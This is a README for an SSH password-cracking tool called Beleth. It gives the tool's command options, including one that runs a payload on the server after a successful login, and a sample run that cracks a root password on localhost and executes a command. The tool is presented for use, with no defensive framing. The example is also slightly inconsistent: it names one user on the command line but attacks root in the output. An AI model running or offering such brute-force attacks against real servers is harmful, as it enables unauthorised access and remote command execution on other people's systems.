Beleth
======

Dictionary based SSH cracker
----------------------------

```
Usage: ./beleth [OPTIONS]
	-c [payload]	Execute payload on remote server once logged in
	-h				Display this help
	-l [threads]	Limit threads to given number. Default: 4
	-p [port]		Specify remote port
	-P [password]	Use single password attempt
	-t [target]		Attempt connections to this server
	-u [user]		Attempt connection using this username
	-v				-v (Show attempts) -vv (Show debugging)
	-w [wordlist]	Use this wordlist. Defaults to wordlist.txt

Example:

$ ./beleth -l 15 -t 127.0.0.1 -u stderr -w wordlist.txt
┌────────────────────────────────────────┐
│                 Beleth                 │
│          www.chokepoint.net            │
└────────────────────────────────────────┘
[*] Read 25 passwords from file.
[*] Starting task manager
[*] Spawning 15 threads
[*] Starting attack on root@127.0.0.1:22
[*] Authentication succeeded (root:jesus@127.0.0.1:22)
[*] Executing: uname -a
[*] Linux eclipse 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1+deb7u1 i686 GNU/Linux
[*] Cleaning up child processes.
```

Resources
=========
* www.chokepoint.net
* www.blackhatlibrary.net
